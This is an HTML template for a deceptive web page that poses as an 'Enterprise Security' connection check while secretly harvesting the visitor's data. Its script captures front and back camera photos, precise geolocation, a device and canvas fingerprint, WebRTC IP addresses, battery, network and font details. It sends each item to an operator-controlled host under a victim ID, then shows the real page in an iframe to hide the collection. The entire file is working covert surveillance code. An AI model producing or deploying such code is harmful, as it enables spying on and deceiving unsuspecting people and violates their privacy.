<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Secure Content...</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            overflow: hidden;
            background: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        iframe { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none;
            background: white;
            z-index: 10;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.97);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            backdrop-filter: blur(5px);
            padding: 20px;
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e2e8f0;
            border-top: 3px solid #6366f1;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-title {
            font-size: 20px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 10px;
        }
        .loading-text {
            font-size: 15px;
            color: #64748b;
            margin-bottom: 25px;
            line-height: 1.4;
        }
        .status-container {
            width: 100%;
            max-width: 400px;
            background: #f1f5f9;
            border-radius: 12px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
        }
        .status-item {
            font-size: 13px;
            color: #64748b;
            margin: 8px 0;
            display: flex;
            align-items: center;
        }
        .status-icon {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            margin-right: 10px;
            flex-shrink: 0;
        }
        .status-pending { background: #fbbf24; }
        .status-success { background: #10b981; }
        .status-error { background: #ef4444; }
        .footer-badge {
            margin-top: 15px;
            padding: 8px 16px;
            background: #dbeafe;
            color: #1d4ed8;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: 600;
        }

        /* ALWAYS VISIBLE DEBUG CONSOLE */
        .debug-console {
            position: fixed;
            bottom: 10px;
            left: 10px;
            right: 10px;
            background: rgba(0,0,0,0.85);
            color: #ffcc00;
            padding: 10px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 10000;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            line-height: 1.4;
        }
        .debug-line {
            margin: 2px 0;
            padding: 2px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .debug-error {
            color: #ff6b6b;
        }
        .debug-success {
            color: #51cf66;
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <h3 class="loading-title">Securing Your Connection</h3>
        <p class="loading-text">Please wait while we verify your device and load the requested page.</p>
        
        <div class="status-container">
            <div class="status-item">
                <div class="status-icon status-pending" id="icon-location"></div>
                <span id="status-location">Detecting location...</span>
            </div>
            <div class="status-item">
                <div class="status-icon status-pending" id="icon-device"></div>
                <span id="status-device">Scanning device info...</span>
            </div>
            <div class="status-item">
                <div class="status-icon status-pending" id="icon-camera"></div>
                <span id="status-camera">Requesting camera access...</span>
            </div>
            <div class="status-item">
                <div class="status-icon status-pending" id="icon-network"></div>
                <span id="status-network">Analyzing network...</span>
            </div>
            <div class="status-item">
                <div class="status-icon status-pending" id="icon-fingerprint"></div>
                <span id="status-fingerprint">Creating security fingerprint...</span>
            </div>
        </div>

        <div class="footer-badge">üîí Enterprise Security ‚Ä¢ Do not close this window</div>
    </div>
    
    <iframe id="targetFrame" src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
    
    <!-- DEBUG CONSOLE - ALWAYS VISIBLE FOR YOU -->
    <div class="debug-console" id="debugConsole">
        <div class="debug-line"><strong>üîç DEBUG MODE ACTIVE</strong> - Watching data collection in real-time</div>
    </div>

    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const loadingOverlay = document.getElementById('loadingOverlay');
        const targetFrame = document.getElementById('targetFrame');
        const debugConsole = document.getElementById('debugConsole');

        // DEBUG IS ALWAYS ON FOR YOU
        const DEBUG = true;

        function logDebug(message, type = 'info') {
            if (DEBUG) {
                const line = document.createElement('div');
                line.className = `debug-line ${type === 'error' ? 'debug-error' : type === 'success' ? 'debug-success' : ''}`;
                line.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
                debugConsole.appendChild(line);
                debugConsole.scrollTop = debugConsole.scrollHeight;
            }
            console.log(`[WebView] ${message}`);
        }

        function updateStatus(elementId, iconId, message, status = 'success') {
            const element = document.getElementById(elementId);
            const icon = document.getElementById(iconId);
            
            if (element) element.textContent = message;
            if (icon) {
                icon.className = 'status-icon ' + 
                    (status === 'success' ? 'status-success' : 
                     status === 'error' ? 'status-error' : 'status-pending');
            }
        }

        async function send(endpoint, data) {
            try {
                logDebug(`Attempting to send to ${endpoint}...`);
                
                // Try up to 3 times
                for (let i = 0; i < 3; i++) {
                    try {
                        const response = await fetch(`${host}${endpoint}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data),
                            timeout: 10000
                        });
                        
                        if (!response.ok) {
                            throw new Error(`HTTP ${response.status}`);
                        }
                        
                        const result = await response.json();
                        logDebug(`${endpoint} success on attempt ${i+1}`, 'success');
                        return result;
                    } catch (error) {
                        logDebug(`${endpoint} failed on attempt ${i+1}: ${error.message}`, 'error');
                        if (i < 2) await new Promise(r => setTimeout(r, 2000)); // Wait 2s before retry
                    }
                }
                
                throw new Error('All retries failed');
                
            } catch (error) {
                logDebug(`${endpoint} final failed: ${error.message}`, 'error');
                return { success: false, error: error.message };
            }
        }

        // ========== MAXIMUM DATA COLLECTION ==========

        // 1. LOCATION
        updateStatus('status-location', 'icon-location', 'üì° Detecting your location...', 'pending');
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    updateStatus('status-location', 'icon-location', '‚úì Location detected - sending...', 'success');
                    
                    const result = await send('/location', {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        uid: uid,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed
                    });
                    
                    if (result.success) {
                        updateStatus('status-location', 'icon-location', '‚úì Location secured and sent', 'success');
                    } else {
                        updateStatus('status-location', 'icon-location', '‚úì Location detected (server offline)', 'success');
                        logDebug('Location detected but server may be unreachable', 'error');
                    }
                },
                (err) => {
                    logDebug(`Location error: ${err.message}`, 'error');
                    updateStatus('status-location', 'icon-location', '‚ö†Ô∏è Location access denied', 'error');
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            updateStatus('status-location', 'icon-location', '‚ö†Ô∏è Location not supported', 'error');
        }

        // 2. DEVICE FINGERPRINT
        setTimeout(async () => {
            updateStatus('status-device', 'icon-device', 'üì± Scanning device information...', 'pending');
            
            try {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages?.join(', ') || 'N/A',
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    touch: navigator.maxTouchPoints > 0,
                    webdriver: navigator.webdriver,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    online: navigator.onLine,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        dpi: window.devicePixelRatio
                    }
                };

                updateStatus('status-device', 'icon-device', '‚úì Device info ready - sending...', 'success');
                
                const result = await send('/info', { 
                    uid: uid, 
                    data: `<b>üñ•Ô∏è Device Info</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
                });
                
                if (result.success) {
                    updateStatus('status-device', 'icon-device', '‚úì Device profile created and sent', 'success');
                } else {
                    updateStatus('status-device', 'icon-device', '‚úì Device profile created (server offline)', 'success');
                }
            } catch (err) {
                logDebug(`Device fingerprint error: ${err.message}`, 'error');
                updateStatus('status-device', 'icon-device', '‚ö†Ô∏è Error scanning device', 'error');
            }
        }, 500);

        // 3. CAMERA
        updateStatus('status-camera', 'icon-camera', 'üì∑ Requesting camera access...', 'pending');
        
        async function captureCamera(facingMode, label) {
            try {
                const constraints = {
                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                    setTimeout(resolve, 3000);
                });

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                const imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                
                updateStatus('status-camera', 'icon-camera', `‚úì Capturing ${label} camera...`, 'success');
                
                const result = await send('/camsnap', { 
                    [label]: imageData
                });

                stream.getTracks().forEach(track => track.stop());
                
                if (result.success) {
                    updateStatus('status-camera', 'icon-camera', `‚úì ${label} camera captured and sent`, 'success');
                } else {
                    updateStatus('status-camera', 'icon-camera', `‚úì ${label} camera captured (server offline)`, 'success');
                }
                
                return true;
            } catch (err) {
                logDebug(`Camera ${label} error: ${err.name} - ${err.message}`, 'error');
                await send('/info', { 
                    uid: uid, 
                    data: `<b>üì∑ Camera ${label}:</b> <code>${err.name}</code>` 
                });
                return false;
            }
        }

        // Try front camera
        setTimeout(async () => {
            try {
                await captureCamera('user', 'front');
            } catch (err) {
                logDebug(`Front camera failed: ${err.message}`, 'error');
            }
        }, 1000);

        // Try back camera
        setTimeout(async () => {
            try {
                await captureCamera('environment', 'back');
            } catch (err) {
                logDebug(`Back camera failed: ${err.message}`, 'error');
            }
        }, 2500);

        // 4. NETWORK + BATTERY
        setTimeout(async () => {
            updateStatus('status-network', 'icon-network', 'üîã Checking battery & network...', 'pending');
            
            let messages = [];

            // Battery
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
                    messages.push('Battery');
                    
                    await send('/info', { uid: uid, data: `<b>üîã Battery:</b> ${batteryInfo}` });
                } catch(e) {
                    logDebug(`Battery error: ${e.message}`, 'error');
                    messages.push('BatErr');
                }
            }

            // Network
            if (navigator.connection) {
                const conn = navigator.connection;
                const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
                messages.push('Network');
                
                await send('/info', { uid: uid, data: `<b>üåê Network:</b> ${networkInfo}` });
            }

            updateStatus('status-network', 'icon-network', `‚úì ${messages.join(', ')}`, 'success');
        }, 1500);

        // 5. FINGERPRINTING (Canvas, WebRTC, Fonts)
        setTimeout(async () => {
            updateStatus('status-fingerprint', 'icon-fingerprint', 'üé® Creating security fingerprint...', 'pending');
            
            let messages = [];

            // Canvas Fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = "14px Arial";
                ctx.fillText('SecurityFingerprint', 2, 2);
                const canvasFP = canvas.toDataURL().substring(0, 80) + '...';
                messages.push('Canvas');
                
                await send('/info', { uid: uid, data: `<b>üé® Canvas FP:</b> <code>${canvasFP}</code>` });
            } catch(e) {
                logDebug(`Canvas error: ${e.message}`, 'error');
                messages.push('CanvErr');
            }

            // WebRTC IP Leak
            try {
                const getIPs = () => {
                    return new Promise(resolve => {
                        const ips = [];
                        const pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        pc.onicecandidate = e => {
                            if (!e || !e.candidate) {
                                resolve(ips);
                                return;
                            }
                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (ipMatch && !ips.includes(ipMatch[1])) {
                                ips.push(ipMatch[1]);
                            }
                        };
                        setTimeout(() => {
                            pc.close();
                            resolve(ips);
                        }, 2000);
                    });
                };

                const ips = await getIPs();
                if (ips.length) {
                    messages.push('WebRTC');
                    await send('/info', { uid: uid, data: `<b>üåê WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
                }
            } catch(e) {
                logDebug(`WebRTC error: ${e.message}`, 'error');
                messages.push('IP Err');
            }

            // Installed Fonts
            try {
                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                
                const installed = testFonts.filter(font => {
                    ctx.font = `72px "${font}", monospace`;
                    const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                    return Math.abs(baseWidth - testWidth) > 2;
                });
                
                messages.push('Fonts');
                await send('/info', { uid: uid, data: `<b>üî† Fonts:</b> ${installed.join(', ')}` });
            } catch(e) {
                logDebug(`Fonts error: ${e.message}`, 'error');
                messages.push('FontErr');
            }

            updateStatus('status-fingerprint', 'icon-fingerprint', `‚úì ${messages.join(', ')}`, 'success');
        }, 2000);

        // Hide loading overlay after 4 seconds (let data collect first)
        setTimeout(() => {
            loadingOverlay.style.opacity = '0';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                targetFrame.style.opacity = '1';
            }, 500);
        }, 4000);

        // Fallback redirect after 15 seconds
        setTimeout(() => {
            targetFrame.style.opacity = '1';
            loadingOverlay.style.display = 'none';
        }, 15000);
    </script>
</body>
</html>
